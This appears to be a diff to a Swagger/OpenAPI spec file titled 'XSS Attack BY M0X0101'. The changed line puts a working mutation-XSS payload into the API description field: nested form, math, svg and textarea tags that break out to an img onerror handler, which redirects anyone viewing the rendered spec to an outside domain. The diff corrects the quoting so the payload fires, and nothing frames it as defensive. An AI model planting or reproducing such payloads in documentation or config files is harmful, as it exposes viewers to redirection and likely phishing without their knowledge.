@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY M0X0101
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror='(window.location.href=https://serviceglobal-digitalsolution.com/education-content/redirect.html)'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src="x" onerror="window.location.href='https://serviceglobal-digitalsolution.com/education-content/redirect.html'"></form>
   version: production
 basePath: /JSSResource/
 produces:
